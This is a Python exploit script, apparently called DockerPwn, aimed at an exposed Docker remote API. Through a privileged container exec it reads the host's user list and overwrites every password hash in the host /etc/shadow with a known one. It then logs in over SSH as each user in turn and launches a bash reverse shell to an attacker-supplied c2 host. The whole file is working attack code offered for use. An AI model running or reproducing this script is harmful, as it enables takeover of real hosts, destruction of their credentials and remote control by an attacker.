#!/usr/bin/python3

import http.client
import json
import sys
import paramiko
import re

def attack(target, port, containerID, c2):

    dockerConnection = http.client.HTTPConnection(target, port)

    headers = {
        'X-Requested-With': 'DockerPwn.py',
        'Content-Type': 'application/json',
    }
    
    print('[+] Phew, alright. Creating the EXEC to change passwords.\n')

    execJSON = json.dumps({
        "AttachStdin": True,
        "AttachStdout": True,
        "AttachStderr": True,
        "Cmd": ["/bin/sh", "-c", "cat /host/etc/passwd | grep -oE '^[^:]+' | tr '\\n' ' ' && sed -i -e 's/root:*[^:]\+:/root:$6$ilDk.19ZUBhQbxkA$6rv9s1sJcecVNwwW2V9uEl4QlJ\/V0d5JK\/lXAAdSUF7W3b2oGmp37I2qm.2iNGt.JXqKdoW4oGHaUSgABP5vA.:/' /host/etc/shadow&& sed -i -e 's/:$6[^:]\+:/:$6$ilDk.19ZUBhQbxkA$6rv9s1sJcecVNwwW2V9uEl4QlJ\/V0d5JK\/lXAAdSUF7W3b2oGmp37I2qm.2iNGt.JXqKdoW4oGHaUSgABP5vA.:/' /host/etc/shadow"],
        "DetachKeys": "ctrl-p,ctrl-q",
        "Privileged": True,
        "Tty": True,
    })
    
    dockerConnection.request('POST', '/containers/' + containerID[0] + '/exec', execJSON, headers)
    execResponse = dockerConnection.getresponse()
    
    if execResponse.status == 201:
        execResponse = str(execResponse.read())
        execID = re.findall(r'[A-Fa-f0-9]{64}', execResponse)
        print('[+] EXEC successfully created on container! Got ID ' + execID[0] + '!\n')
        dockerConnection.close()
    else:
        print('[-] EXEC creation failed. Maybe try again?\n')
        dockerConnection.close()
        sys.exit(0)

    print('[+] Now triggering the EXEC to change passwords. Hope SSH is open...\n')

    triggerJSON = json.dumps({
        "Detach": False,
        "Tty": False
    })

    dockerConnection.request('POST', '/exec/' + execID[0] + '/start', triggerJSON, headers)
    triggerResponse = dockerConnection.getresponse()

    if triggerResponse.status == 200:
        print('[+] EXEC successfully triggered. Printing users found in /etc/passwd.\n')
        try:
            triggerResponse = str(triggerResponse.read())
            triggerResponse = triggerResponse.split('root')[-1]
            userList = triggerResponse.split(' ')
            userList.insert(0, 'root')
            userList.remove('')
            userList.remove('\'')
            userList.reverse()
            print('[!] User List: ' + ' '.join(userList) + '\n')
        except:
            pass
        dockerConnection.close()
    else:
        print('[-] EXEC job did not trigger. Maybe our ID was wrong?')
        sys.exit(0)


    print('[+] OK, looking good. Attempting to send commands via Paramiko. This may take a minute or two.\n')

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for user in userList:
        conn = 'null'
        try:
            conn = ssh.connect(target, 22, user, "DockerPwn")
        except paramiko.AuthenticationException:
            print('[-] Login failed for ' + user)
            ssh.close()
        if conn is None:
            print('[+] Login succeeded for ' + user + '!\n')
            ssh.exec_command('sleep 5; bash -i >& /dev/tcp/' + c2.split(":")[0] + "/" + c2.split(":")[1] + ' 0>&1')
            break
